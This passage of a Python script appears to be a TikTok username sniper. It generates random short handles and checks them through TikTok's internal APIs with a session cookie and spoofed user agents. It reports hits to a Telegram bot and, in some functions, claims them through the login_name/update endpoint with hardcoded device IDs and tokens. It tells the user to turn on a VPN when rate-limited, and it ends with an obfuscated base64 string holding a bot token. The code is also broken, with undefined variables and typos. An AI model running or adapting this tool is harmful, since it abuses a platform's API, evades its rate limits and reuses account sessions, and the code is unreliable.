		amount = int(amount)
		length2 = 3
		length2 = int(length2)
		
		for password1 in range(amount):
		          password1 = ''
		          for item in range(length2):
		          	password1 = ''
		          for item in range(length2):
		          	password1 += random.choice(chars2)
		          password35="."+password1



		          password2 = ''
		          
		          for item in range(length2):
		          	password2 = ''
		          for item in range(length2):
		          	password2 = random.choice(chars2)
		          for item in range(2):
		          	password3 = ''
		          for item in range (2):
		          	password3 += random.choice(chars2)
		          password27=password2+"."+password3
		          
		          
		          password4 = ''
		          
		          for item in range(2):
		          	password4 = ''
		          for item in range(2):
		          	password4 += random.choice(chars2)
		          for item in range(1):
		          	password5= ""
		          for item in range(1):
		             password5+=random.choice(uesr)
		          for item in range(1):
		             password99 = ''
		          for item in range(1):
		             password99 += random.choice(chars2)
		             password9 = password4+password5+password99
		             
		             
		             
		             useer = '_' 
		             chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
		             
		             for password109 in range(amount):
		             	password109 = ''
		             	for item in range(length2):
		             		password109 = ''
		             	for item in range(length2):
		             		password109 += random.choice(chars2)
		             	password350 = "_" + password109
		             	
		             	password20 = ''
		             	
		             	for item in range(length2):
		             		password20 = ''
		             	for item in range(length2):
		             		password20 = random.choice(chars2)
		             	for item in range(2):
		             		password30 = ''
		             	for item in range (2):
		             		password30 += random.choice(chars2)
		             	password270=password20+"_"+password30
		             		
		             	password40 = ''
		             		
		             	for item in range(2):
		             		password40 = ''
		             	for item in range(2):
		             			password40 += random.choice(chars2)
		             	for item in range(1):
		             			password50 = ""
		             	for item in range(1):
		             			password50 += random.choice(useer)
		             	for item in range(1):
		             			password990 = ''
		             	for item in range(1):
		             			password990 += random.choice(chars2)
		             			password90 = password40 + password50 + password990
		             			password60 = ''
		             			for item in range(3):
		             				password60 = ''
		             			for item in range(3):
		             				password60 += random.choice(chars2)
		             				password100 = password60 + "_"

		             			mylist = [password9,password27,password35,password100,password90,password270,password350]
		             			passwordff=""
		             			fls = passwordff+random.choice(mylist)
		             			url = "https://www.tiktok.com/api/uniqueid/check/?region=SA&aid=1233&unique_id="+fls+"&app_language=ar"
		             			payload = ""
		             			headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "User-Agent": generate_user_agent(),
                "Connection": "close",
                "Host": "www.tiktok.com",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "max-age=0"


		             			}
		             			cookies = {'sessionid': sessionId}
		             			response = requests.request ("GET", url, data=payload, headers=headers ,cookies=cookies)
		             			post = str (response.json()["status_msg"])
		             			if post==""or"":
		             				count += 1
		             				print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls}{g} ❯{wh}❯{b}❯{wh} {g}Availble ✓{res}""")
		             				send =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={tid}&text={fa}{ra}\n{k}`{fls}`{rad}\n{an}\n*{FAQ}*&parse_mode=MARKDOWN')
		             				r = requests.post(send)
		             				with open('found.txt', 'a') as found:
		             					found.write(fls + '\n')
		             			else:
		             				count += 1
		             				print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")
def thlath():
	count = 0
	while True:
		uesr = '.'
		chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789_'
		chars = 'qwertyuiopasdfghjklzxcvbnm0123456789_'
		amount = 1
		amount = int(amount)
		length2 = 2
		length2 = int(length2)
		length1 = 3
		length1 = int(length1)
		flsff = ''
		for item in range(length1):
			flsff += random.choice(chars)
		
		for password1 in range(amount):
		          password1 = ''
		          for item in range(length2):
		          	password1 = ''
		          for item in range(length2):
		          	password1 += random.choice(chars2)
		          password35="."+password1



		          password2 = ''
		          
		          for item in range(length2):
		          	password2 = ''
		          for item in range(length2):
		          	password2 = random.choice(chars2)
		          for item in range(1):
		          	password3 = ''
		          for item in range(1):
		          	password3 += random.choice(chars2)
		          password27=password2+"."+password3
		          
		          
		          password4 = ''
		          
		          for item in range(1):
		          	password4 = ''
		          for item in range(1):
		          	password4 += random.choice(chars2)
		          for item in range(1):
		          	password5= ""
		          for item in range(1):
		             password5+=random.choice(uesr)
		          for item in range(1):
		             password99 = ''
		          for item in range(1):
		             password99 += random.choice(chars2)
		             password9 = password4+password5+password99
		             
		             
		             
		             useer = '_' 
		             chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
		             
		             for password109 in range(amount):
		             	password109 = ''
		             	for item in range(length2):
		             		password109 = ''
		             	for item in range(length2):
		             		password109 += random.choice(chars2)
		             	password350 = "_" + password109
		             	
		             	password20 = ''
		             	
		             	for item in range(length2):
		             		password20 = ''
		             	for item in range(length2):
		             		password20 = random.choice(chars2)
		             	for item in range(1):
		             		password30 = ''
		             	for item in range(1):
		             		password30 += random.choice(chars2)
		             	password270=password20+"_"+password30
		             		
		             	password40 = ''
		             		
		             	for item in range(1):
		             		password40 = ''
		             	for item in range(1):
		             			password40 += random.choice(chars2)
		             	for item in range(1):
		             			password50 = ""
		             	for item in range(1):
		             			password50 += random.choice(useer)
		             	for item in range(1):
		             			password990 = ''
		             	for item in range(1):
		             			password990 += random.choice(chars2)
		             			password90 = password40 + password50 + password990
		             			password60 = ''
		             			for item in range(2):
		             				password60 = ''
		             			for item in range(2):
		             				password60 += random.choice(chars2)
		             				password100 = password60 + "_"

		             			mylist = [flsff,password9,password27,password35,password100,password90,password270,password350,flsff]
		             			passwordff=""
		             			fls = passwordff+random.choice(mylist)
		             			url = "https://www.tiktok.com/api/uniqueid/check/?region=SA&aid=1233&unique_id="+fls+"&app_language=ar"
		             			payload = ""
		             			headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "User-Agent": generate_user_agent(),
                "Connection": "close",
                "Host": "www.tiktok.com",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "max-age=0"


		             			}
		             			cookies = {'sessionid': sessionId}
		             			response = requests.request ("GET", url, data=payload, headers=headers ,cookies=cookies)
		             			post = str (response.json()["status_msg"])
		             			if post==""or"":
		             				count += 1
		             				print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls}{g} ❯{wh}❯{b}❯{wh} {g}Availble ✓{res}""")
		             				send =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={tid}&text={fa}{ra}\n{k}`{fls}`{rad}\n{an}\n*{FAQ}*&parse_mode=MARKDOWN')
		             				r = requests.post(send)
		             				with open('found.txt', 'a') as found:
		             					found.write(fls + '\n')
		             			else:
		             				count += 1
		             				print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")
	
def rbaeewol():
	count = 0
	while True:
	       uesr = '.' 
	       chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789_'
	       chars1 = 'qwertyuiopasdfghjklzxcvbnm0123456789___'
	       amount = 1
	       amount = int(amount)
	       length2 = 3
	       length2 = int(length2)
	       length1 = 4
	       length1 = int(length1)
	       flsff = ''
	       for item in range(length1):
	       	flsff += random.choice(chars1)

	       for password1 in range(amount):
	       	   password1 = ''
	       for item in range(length2):
	       	   password1 = ''
	       for item in range(length2):
	       	   password1 += random.choice(chars2)
	       password35="."+password1



	       password2 = ''

	       for item in range(length2):
	       	   password2 = ''
	       for item in range(length2):
	       	   password2 = random.choice(chars2)
	       for item in range(2):
	       	   password3 = ''
	       for item in range(2):
	       	   password3 += random.choice(chars2)
	       password27=password2+"."+password3


	       password4 = ''
	       	
	       for item in range(2):
	       	   password4 = ''
	       for item in range(2):
	       	   password4 += random.choice(chars2)
	       for item in range(1):
	       	   password5= ""
	       for item in range(1):
	       	   password5+=random.choice(uesr)
	       for item in range(1):
	       	   password99 = ''
	       for item in range(1):
	       	    password99 += random.choice(chars2)
	       	    password9 = password4+password5+password99
	       	    
	       mylist = [flsff,password35,password27,flsff,password9,flsff]
	       ffls=""
	       fls = ffls+random.choice(mylist)
	       time.sleep(0.1)
	       weblog = f'https://www.tiktok.com/@{fls}'
	       rq = requests.get(weblog, headers=headerswol)
	       if rq.status_code == 404:
	       	count += 1
	       	print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls}{g} ❯{wh}❯{b}❯{wh} {g}Availble ✓{res}""")
	       	send =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={tid}&text={fa}{ra}\n{k}`{fls}`{rad}\n{an}\n*{FAQ}*&parse_mode=MARKDOWN')
	       	r = requests.post(send)
	       	with open('found.txt', 'a') as found:
	       		found.write(fls + '\n')
	       elif rq.status_code == 200:
	       	count += 1
	       	print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")
def shbhwol():
	count = 0
	while True:
		uesr = '.'
		chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
		amount = 1
		amount = int(amount)
		length2 = 3
		length2 = int(length2)
		
		for password1 in range(amount):
		          password1 = ''
		          for item in range(length2):
		          	password1 = ''
		          for item in range(length2):
		          	password1 += random.choice(chars2)
		          password35="."+password1



		          password2 = ''
		          
		          for item in range(length2):
		          	password2 = ''
		          for item in range(length2):
		          	password2 = random.choice(chars2)
		          for item in range(2):
		          	password3 = ''
		          for item in range (2):
		          	password3 += random.choice(chars2)
		          password27=password2+"."+password3
		          
		          
		          password4 = ''
		          
		          for item in range(2):
		          	password4 = ''
		          for item in range(2):
		          	password4 += random.choice(chars2)
		          for item in range(1):
		          	password5= ""
		          for item in range(1):
		             password5+=random.choice(uesr)
		          for item in range(1):
		             password99 = ''
		          for item in range(1):
		             password99 += random.choice(chars2)
		             password9 = password4+password5+password99
		             
		             
		             
		             useer = '_' 
		             chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
		             
		             for password109 in range(amount):
		             	password109 = ''
		             	for item in range(length2):
		             		password109 = ''
		             	for item in range(length2):
		             		password109 += random.choice(chars2)
		             	password350 = "_" + password109
		             	
		             	password20 = ''
		             	
		             	for item in range(length2):
		             		password20 = ''
		             	for item in range(length2):
		             		password20 = random.choice(chars2)
		             	for item in range(2):
		             		password30 = ''
		             	for item in range (2):
		             		password30 += random.choice(chars2)
		             	password270=password20+"_"+password30
		             		
		             	password40 = ''
		             		
		             	for item in range(2):
		             		password40 = ''
		             	for item in range(2):
		             			password40 += random.choice(chars2)
		             	for item in range(1):
		             			password50 = ""
		             	for item in range(1):
		             			password50 += random.choice(useer)
		             	for item in range(1):
		             			password990 = ''
		             	for item in range(1):
		             			password990 += random.choice(chars2)
		             			password90 = password40 + password50 + password990
		             			password60 = ''
		             			for item in range(3):
		             				password60 = ''
		             			for item in range(3):
		             				password60 += random.choice(chars2)
		             				password100 = password60 + "_"

		             			mylist = [password9,password27,password35,password100,password90,password270,password350]
		             			passwordff=""
		             			fls = passwordff+random.choice(mylist)
		             			weblog = f'https://www.tiktok.com/@{fls}'
		             			rq = requests.get(weblog, headers=headerswol)
		             			if rq.status_code == 404:
		             			  	 	count += 1
		             			  	 	print(f"""{Style.BRIGHT}│
├──╼ {b}[{g}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {g}Availble ✓{res}""")
		             			  	 	send =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={tid}&text={fa}{ra}\n{k}`{user}`{rad}\n{an}\n*{FAQ}*&parse_mode=MARKDOWN')
		             			  	 	r = requests.post(send)
		             			  	 	with open('found.txt', 'a') as found:
		             			  	 		found.write(fls + '\n')
		             			elif rq.status_code == 200:
		             				count += 1
		             				print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")

def thlathwol():
	count = 0
	while True:
		chars = 'qwertyuiopasdfghjklzxcvbnm0123456789__'
		amount = 1
		amount = int(amount)
		length = 2
		length =int(length)
		length1 = 3
		length1 = int(length1)
		flsff = ''
		for item in range(length1):
			flsff += random.choice(chars)
		
		for password1 in range(amount):
			password1 = ''
			for item in range(length):
				password1 = ''
			for item in range(length):
			    password1 += random.choice(chars)
			password35="."+password1
		
			password2 = ''
		
			for item in range(length):
				password2 = ''
			for item in range(length):
				password2 = random.choice(chars)
			for item in range(1):
				password3 = ''
			for item in range (1):
				password3 += random.choice(chars)
			password27=password2+"."+password3
		
		
			password4 = ''
		
			for item in range(1):
				password4 = ''
			for item in range(1):
				password4 += random.choice(chars)
			for item in range(1):
				password5= ""
			for item in range(1):
				password5+=random.choice(".")
			for item in range(1):
				password99 = ''
			for item in range(2):
				password99 += random.choice(chars)
				password9 = password4+password5+password99
				
		mylist = [flsff, password35, flsff, password27]
		ffls=''
		fls = ffls+random.choice(mylist)
		weblog = f'https://www.tiktok.com/@{fls}'
		rq = requests.get(weblog, headers=headerswol)
		if rq.status_code == 404:
			count += 1
			print(f"""{Style.BRIGHT}│
├──╼ {b}[{g}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {g}Availble ✓{res}""")
			send =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={tid}&text={fa}{ra}\n{k}`{fls}`{rad}\n{an}\n*{FAQ}*&parse_mode=MARKDOWN')
			r = requests.post(send)
			with open('found.txt', 'a') as found:
				found.write(fls + '\n')
		elif rq.status_code == 200:
			count += 1
			print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")

def rbaeetc():
	count = 0
	while True:
	       uesr = '.' 
	       chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789_'
	       chars1 = 'qwertyuiopasdfghjklzxcvbnm0123456789___'
	       amount = 1
	       amount = int(amount)
	       length2 = 3
	       length2 = int(length2)
	       length1 = 4
	       length1 = int(length1)
	       flsff = ''
	       for item in range(length1):
	       	flsff += random.choice(chars1)

	       for password1 in range(amount):
	       	   password1 = ''
	       for item in range(length2):
	       	   password1 = ''
	       for item in range(length2):
	       	   password1 += random.choice(chars2)
	       password35="."+password1



	       password2 = ''

	       for item in range(length2):
	       	   password2 = ''
	       for item in range(length2):
	       	   password2 = random.choice(chars2)
	       for item in range(2):
	       	   password3 = ''
	       for item in range(2):
	       	   password3 += random.choice(chars2)
	       password27=password2+"."+password3


	       password4 = ''
	       	
	       for item in range(2):
	       	   password4 = ''
	       for item in range(2):
	       	   password4 += random.choice(chars2)
	       for item in range(1):
	       	   password5= ""
	       for item in range(1):
	       	   password5+=random.choice(uesr)
	       for item in range(1):
	       	   password99 = ''
	       for item in range(1):
	       	    password99 += random.choice(chars2)
	       	    password9 = password4+password5+password99
	       	    
	       mylist = [flsff,password35,password27,flsff,password9,flsff]
	       ffls=""
	       fls = ffls+random.choice(mylist)
	       time.sleep(0.1)
	       url = "https://www.tiktok.com/api/uniqueid/check/?region=SA&aid=1233&unique_id="+fls+"&app_language=ar"
	       payload = ""
	       headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "User-Agent": generate_user_agent(),
                "Connection": "close",
                "Host": "www.tiktok.com",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "max-age=0"


	       }
	       cookies = {'sessionid': sessionId}
	       response = requests.request ("GET", url, data=payload, headers=headers ,cookies=cookies)
	       post = str (response.json()["status_msg"])
	       if post==""or"":
	       	count += 1
	       	print(f"""{Style.BRIGHT}│
├──╼ {b}[{g}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {g}Availble ✓{res}""")
	       	send =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={tid}&text={fa}{ra}\n{k}`{fls}`{rad}\n{an}\n*{FAQ}*&parse_mode=MARKDOWN')
	       	url = 'https://api16-normal-c-alisg.tiktokv.com/passport/login_name/update/?residence=SA&device_id=6870709334024848901&os_version=13.6.1&app_id=1233&iid=6924902298624624385&app_name=musical_ly'
	       	headerstc	 = {
                        'Host': 'api16-normal-c-alisg.tiktokv.com',
                        'Connection': 'close',
                        'Content-Length': '25',
                        'Cookie': f'sessionid={sessionId}',
                        "x-tt-passport-csrf-token": f"{sessiones}",
                        'x-Tt-Token': '2c593820065f9a47b9bf51281eda9604-1.0.0-1.0.0',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'sdk-version': '2',
                        'passport-sdk-version': '5.12.1'
	       	}
	       	data = {
	       	'login_name': f'{fls}'
	       	}
	       	r = requests.post(send)
	       	stts = requests.post(url, data=data, headers=headerstc).text
	       	if '"message":"success"' in stts:
	       		print(f"""{Style.BRIGHT}
│
└──╼ {b}{b}[{g}✓{b}]{wh}{re} ❯{wh}❯{b}❯{wh} {fls} is now in {sessionId} {res}""")
	       	elif '"description":"You are visiting our service too frequently."' in stts:
	       		print(f"""{Style.BRIGHT}
│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Your IP Blocked Turn On VPN {res}""")
	       	elif '"description":"The conversation has expired, please log in again"' in stts:
	       		print(f"""{Style.BRIGHT}
│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} SessionID Expired Get Another Session {res}""")
	       	elif '"description":"login name can only be updated once within one month."' in stts:
	       		print(f"""{Style.BRIGHT}
│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Cannot Change The User Until Month {res}""")
	       	elif '"message":"error"' in stts:
	       		print(f"""{Style.BRIGHT}
│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Error {res}""")
	       elif post == "Your login has expired":
	       	       print(f"""{Style.BRIGHT}
│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Your Login Has Expired {res}""")
	       	       exit()
	       else:
	                count += 1
	                print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls} {re}❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")

def shbhtc():
	count = 0
	while True:
		uesr = '.'
		chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
		amount = 1
		amount = int(amount)
		length2 = 3
		length2 = int(length2)
		
		for password1 in range(amount):
		          password1 = ''
		          for item in range(length2):
		          	password1 = ''
		          for item in range(length2):
		          	password1 += random.choice(chars2)
		          password35="."+password1



		          password2 = ''
		          
		          for item in range(length2):
		          	password2 = ''
		          for item in range(length2):
		          	password2 = random.choice(chars2)
		          for item in range(2):
		          	password3 = ''
		          for item in range (2):
		          	password3 += random.choice(chars2)
		          password27=password2+"."+password3
		          
		          
		          password4 = ''
		          
		          for item in range(2):
		          	password4 = ''
		          for item in range(2):
		          	password4 += random.choice(chars2)
		          for item in range(1):
		          	password5= ""
		          for item in range(1):
		             password5+=random.choice(uesr)
		          for item in range(1):
		             password99 = ''
		          for item in range(1):
		             password99 += random.choice(chars2)
		             password9 = password4+password5+password99
		             
		             
		             
		             useer = '_' 
		             chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
		             
		             for password109 in range(amount):
		             	password109 = ''
		             	for item in range(length2):
		             		password109 = ''
		             	for item in range(length2):
		             		password109 += random.choice(chars2)
		             	password350 = "_" + password109
		             	
		             	password20 = ''
		             	
		             	for item in range(length2):
		             		password20 = ''
		             	for item in range(length2):
		             		password20 = random.choice(chars2)
		             	for item in range(2):
		             		password30 = ''
		             	for item in range (2):
		             		password30 += random.choice(chars2)
		             	password270=password20+"_"+password30
		             		
		             	password40 = ''
		             		
		             	for item in range(2):
		             		password40 = ''
		             	for item in range(2):
		             			password40 += random.choice(chars2)
		             	for item in range(1):
		             			password50 = ""
		             	for item in range(1):
		             			password50 += random.choice(useer)
		             	for item in range(1):
		             			password990 = ''
		             	for item in range(1):
		             			password990 += random.choice(chars2)
		             			password90 = password40 + password50 + password990
		             			password60 = ''
		             			for item in range(3):
		             				password60 = ''
		             			for item in range(3):
		             				password60 += random.choice(chars2)
		             				password100 = password60 + "_"

		             			mylist = [password9,password27,password35,password100,password90,password270,password350]
		             			passwordff=""
		             			fls = passwordff+random.choice(mylist)
		             			url = "https://www.tiktok.com/api/uniqueid/check/?region=SA&aid=1233&unique_id="+fls+"&app_language=ar"
		             			payload = ""
		             			headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "User-Agent": generate_user_agent(),
                "Connection": "close",
                "Host": "www.tiktok.com",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "max-age=0"


		             			}
		             			cookies = {'sessionid': sessionId}
		             			response = requests.request ("GET", url, data=payload, headers=headers ,cookies=cookies)
		             			post = str (response.json()["status_msg"])
		             			if post==""or"":
		             				count += 1
		             				print(f"""{Style.BRIGHT}│
├──╼ {b}[{g}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {g}Availble ✓{res}""")
		             				send =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={tid}&text={fa}{ra}\n{k}`{fls}`{rad}\n{an}\n*{FAQ}*&parse_mode=MARKDOWN')
		             				r = requests.post(send)
		             				url = 'https://api16-normal-c-alisg.tiktokv.com/passport/login_name/update/?residence=SA&device_id=6870709334024848901&os_version=13.6.1&app_id=1233&iid=6924902298624624385&app_name=musical_ly'
		             				headerstc	 = {
                        'Host': 'api16-normal-c-alisg.tiktokv.com',
                        'Connection': 'close',
                        'Content-Length': '25',
                        'Cookie': f'sessionid={sessionId}',
                        "x-tt-passport-csrf-token": f"{sessiones}",
                        'x-Tt-Token': '2c593820065f9a47b9bf51281eda9604-1.0.0-1.0.0',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'sdk-version': '2',
                        'passport-sdk-version': '5.12.1'
		             				}
		             				data = {
		             				'login_name': f'{fls}'
		             				}
		             				stts = requests.post(url, data=data, headers=headerstc).text
		             				if '"message":"success"' in stts:
		             					print(f"""{Style.BRIGHT}│
└──╼ {b}{b}[{g}✓{b}]{wh}{re} ❯{wh}❯{b}❯{wh} {fls} is now in {sessionId} {res}""")
		             				elif '"description":"You are visiting our service too frequently."' in stts:
		             					print(f"""{Style.BRIGHT}│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Your IP Blocked Turn On VPN {res}""")
		             				elif '"description":"The conversation has expired, please log in again"' in stts:
		             					print(f"""{Style.BRIGHT}│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} SessionID Expired Get Another Session {res}""")
		             				elif '"description":"login name can only be updated once within one month."' in stts:
		             					print(f"""{Style.BRIGHT}│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Cannot Change The User Until Month {res}""")
		             				elif '"message":"error"' in stts:
		             					print(f"""{Style.BRIGHT}│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Error {res}""")
		             				elif post == "Your login has expired":
		             					print(f"""{Style.BRIGHT}│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Your Login Has Expired {res}""")
		             					exit()
		             				else:
		             					count += 1
		             					print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls} {re}❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")
		             			else:
		             				count += 1
		             				print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")

def thlathtc():
	count = 0
	while True:
		uesr = '.'
		chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789_'
		chars = 'qwertyuiopasdfghjklzxcvbnm0123456789'
		amount = 1
		amount = int(amount)
		length2 = 2
		length2 = int(length2)
		length1 = 3
		length1 = int(length1)
		flsff = ''
		for item in range(length1):
			flsff += random.choice(chars)

		for password1 in range(amount):
		          password1 = ''
		          for item in range(length2):
		          	password1 = ''
		          for item in range(length2):
		          	password1 += random.choice(chars2)
		          password35="."+password1



		          password2 = ''
		          
		          for item in range(length2):
		          	password2 = ''
		          for item in range(length2):
		          	password2 = random.choice(chars2)
		          for item in range(1):
		          	password3 = ''
		          for item in range(1):
		          	password3 += random.choice(chars2)
		          password27=password2+"."+password3
		          
		          
		          password4 = ''
		          
		          for item in range(1):
		          	password4 = ''
		          for item in range(1):
		          	password4 += random.choice(chars2)
		          for item in range(1):
		          	password5= ""
		          for item in range(1):
		             password5+=random.choice(uesr)
		          for item in range(1):
		             password99 = ''
		          for item in range(1):
		             password99 += random.choice(chars2)
		             password9 = password4+password5+password99
		             
		             
		             
		             useer = '_' 
		             chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
		             
		             for password109 in range(amount):
		             	password109 = ''
		             	for item in range(length2):
		             		password109 = ''
		             	for item in range(length2):
		             		password109 += random.choice(chars2)
		             	password350 = "_" + password109
		             	
		             	password20 = ''
		             	
		             	for item in range(length2):
		             		password20 = ''
		             	for item in range(length2):
		             		password20 = random.choice(chars2)
		             	for item in range(1):
		             		password30 = ''
		             	for item in range(1):
		             		password30 += random.choice(chars2)
		             	password270=password20+"_"+password30
		             		
		             	password40 = ''
		             		
		             	for item in range(1):
		             		password40 = ''
		             	for item in range(1):
		             			password40 += random.choice(chars2)
		             	for item in range(1):
		             			password50 = ""
		             	for item in range(1):
		             			password50 += random.choice(useer)
		             	for item in range(1):
		             			password990 = ''
		             	for item in range(1):
		             			password990 += random.choice(chars2)
		             			password90 = password40 + password50 + password990
		             			password60 = ''
		             			for item in range(2):
		             				password60 = ''
		             			for item in range(2):
		             				password60 += random.choice(chars2)
		             				password100 = password60 + "_"

		             			mylist = [flsff,password9,password27,password35,password100,password90,password270,password350,flsff]
		             			passwordff=""
		             			fls = passwordff+random.choice(mylist)
		             			url = "https://www.tiktok.com/api/uniqueid/check/?region=SA&aid=1233&unique_id="+fls+"&app_language=ar"
		             			payload = ""
		             			headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "User-Agent": generate_user_agent(),
                "Connection": "close",
                "Host": "www.tiktok.com",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "max-age=0"


		             			}
		             			cookies = {'sessionid': sessionId}
		             			response = requests.request ("GET", url, data=payload, headers=headers ,cookies=cookies)
		             			post = str (response.json()["status_msg"])
		             			if post==""or"":
		             				count += 1
		             				print(f"""{Style.BRIGHT}│
├──╼ {b}[{g}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {g}Availble ✓{res}""")
		             				send =(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={tid}&text={fa}{ra}\n{k}`{fls}`{rad}\n{an}\n*{FAQ}*&parse_mode=MARKDOWN')
		             				r = requests.post(send)
		             				url = 'https://api16-normal-c-alisg.tiktokv.com/passport/login_name/update/?residence=SA&device_id=6870709334024848901&os_version=13.6.1&app_id=1233&iid=6924902298624624385&app_name=musical_ly'
		             				headerstc	 = {
                        'Host': 'api16-normal-c-alisg.tiktokv.com',
                        'Connection': 'close',
                        'Content-Length': '25',
                        'Cookie': f'sessionid={sessionId}',
                        "x-tt-passport-csrf-token": f"{sessiones}",
                        'x-Tt-Token': '2c593820065f9a47b9bf51281eda9604-1.0.0-1.0.0',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'sdk-version': '2',
                        'passport-sdk-version': '5.12.1'
		             				}
		             				stts = requests.post(url, data=data, headers=headerstc).tex
		             				if '"message":"success"' in stts:
		             					print(f"""{Style.BRIGHT}
│
└──╼ {b}{b}[{g}✓{b}]{wh}{re} ❯{wh}❯{b}❯{wh} {fls} is now in {sessionId} {res}""")
		             				elif '"description":"You are visiting our service too frequently."' in stts:
		             					print(f"""{Style.BRIGHT}
│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Your IP Blocked Turn On VPN {res}""")
		             				elif '"description":"The conversation has expired, please log in again"' in stts:
		             					print(f"""{Style.BRIGHT}
│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} SessionID Expired Get Another Session {res}""")
		             				elif '"description":"login name can only be updated once within one month."' in stts:
		             					print(f"""{Style.BRIGHT}
│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Cannot Change The User Until Month {res}""")
		             				elif '"message":"error"' in stts:
		             					print(f"""{Style.BRIGHT}
│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Error {res}""")
		             				elif post == "Your login has expired":
		             					print(f"""{Style.BRIGHT}
│
└──╼ {b}[{re}✘{b}]{wh}{re} ❯{wh}❯{b}❯{wh} Your Login Has Expired {res}""")
		             					exit()
		             				else:
		             					count += 1
		             					print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls} {re}❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")
		             			else:
		             				count += 1
		             				print(f"""{Style.BRIGHT}│
├──╼ {b}[{re}{count}{b}]{wh} {fls}{re} ❯{wh}❯{b}❯{wh} {re}Not Availble ✘{res}""")

magic = 'dGNhZCA9ICIxNTk0MjIxMjk1OkFBRXhBN3R4LWlqbUphUjRIUEp1OU5kMk5ydHMxbXJmb'
